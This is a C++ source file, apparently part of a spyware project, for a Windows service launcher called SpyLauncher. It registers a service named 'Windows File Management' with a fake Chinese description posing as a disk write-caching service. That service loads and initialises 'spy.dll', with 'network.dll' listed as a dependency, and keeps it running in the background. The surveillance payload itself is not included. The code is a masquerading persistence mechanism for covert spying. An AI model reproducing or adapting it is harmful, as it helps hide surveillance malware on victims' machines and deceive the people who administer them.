// SpyLauncher.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "..\Utility\ServiceManager\ServiceManager.h"
#include <Shlwapi.h>

#define SERVICE_NAME _T("Windows File Management")
#define SERVICE_DESC _T("启用磁盘上的写入缓存，如果此服务被终止，任何直接依赖于此服务的服务将无法启动。")
#define SERVICE_STOP_EVENT_NAME _T("SpyStopEvent")

SERVICE_STATUS_HANDLE hStatusHandle = NULL;

VOID WINAPI ServiceHandler( DWORD fdwControl )
{
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SERVICE_STATUS status;
    if(hSCM != NULL)
    {
        SC_HANDLE hService = ::OpenService(hSCM, SERVICE_NAME, SERVICE_ALL_ACCESS);
        if(hService != NULL)
        {
            QueryServiceStatus(hService, &status);
            switch(fdwControl)
            {
            case SERVICE_CONTROL_PAUSE:
                status.dwCurrentState = SERVICE_PAUSED;
                break;

            case SERVICE_CONTROL_CONTINUE:
                status.dwCurrentState = SERVICE_RUNNING;
                break;
            case SERVICE_CONTROL_STOP: 
            case SERVICE_CONTROL_SHUTDOWN:
                {
                    status.dwCurrentState    = SERVICE_STOPPED;
                    status.dwWin32ExitCode    = 0;
                    status.dwCheckPoint        = 0;
                    status.dwWaitHint        = 0;
                    HANDLE hStopEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, SERVICE_STOP_EVENT_NAME);
                    if (hStopEvent)
                    {
                        SetEvent(hStopEvent);
                        CloseHandle(hStopEvent);
                    }
                }
                break;
            case SERVICE_CONTROL_INTERROGATE:
                break;

            default:
                break;
            }
            SetServiceStatus(hStatusHandle, &status);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
}

VOID WINAPI                            ServiceMain( DWORD /*dwArgc*/, LPTSTR * /*lpszArgv*/ )
{    
    SERVICE_STATUS serviceStatus;
    serviceStatus.dwServiceType        = SERVICE_WIN32; 
    serviceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
    serviceStatus.dwWin32ExitCode      = 0; 
    serviceStatus.dwServiceSpecificExitCode = 0; 
    serviceStatus.dwCheckPoint         = 0; 
    serviceStatus.dwWaitHint           = 0;
    Sleep(1000);

    hStatusHandle = ::RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceHandler);
    if(hStatusHandle != NULL)
    {
        DWORD status = GetLastError(); 
        if(status != NO_ERROR) 
        {
            serviceStatus.dwWin32ExitCode = status; 
            serviceStatus.dwServiceSpecificExitCode = 0xfffffff; 
        }
        serviceStatus.dwCurrentState = (status != NO_ERROR) ? SERVICE_STOPPED : SERVICE_RUNNING;
        SetServiceStatus(hStatusHandle, &serviceStatus);
        typedef int(*TFunc)();
        HMODULE hTemp = ::LoadLibrary(_T("spy.dll"));
        TFunc pFunc = (TFunc)::GetProcAddress(hTemp, "Init");
        BEATS_ASSERT(pFunc != NULL, _T("Get function Init from spy.dll failed!"));
        pFunc();
        HANDLE hStopEvent = CreateEvent(NULL, FALSE, FALSE, SERVICE_STOP_EVENT_NAME);
        WaitForSingleObject(hStopEvent, INFINITE);
        pFunc = (TFunc)::GetProcAddress(hTemp, "Uninit");
        BEATS_ASSERT(pFunc != NULL, _T("Get function Uninit from spy.dll failed!"));
        pFunc();

        CloseHandle(hStopEvent);
    }
}

int _tmain(int argc, _TCHAR* argv[])
{
    bool bInstallMode = argc > 1 && _tcsicmp(argv[1], _T("InstallMode")) == 0;
    if (bInstallMode)
    {
        std::vector<TString> dependencyDll;
        TCHAR szCurPath[MAX_PATH];
        GetModuleFileName(NULL, szCurPath, MAX_PATH);
        PathRemoveFileSpec(szCurPath);
        _tcscat(szCurPath, _T("\\spy.dll"));
        dependencyDll.push_back(szCurPath);
        PathRemoveFileSpec(szCurPath);
        _tcscat(szCurPath, _T("\\network.dll"));
        dependencyDll.push_back(szCurPath);
        CServiceManager::GetInstance()->Install(SERVICE_NAME, SERVICE_DESC, &dependencyDll);
    }
    else
    {
        SERVICE_TABLE_ENTRY ServiceTable[2];
        ServiceTable[0].lpServiceName = _T("");
        ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
        ServiceTable[1].lpServiceName = NULL;
        ServiceTable[1].lpServiceProc = NULL;
        StartServiceCtrlDispatcher(ServiceTable);
    }
    return 0;
}

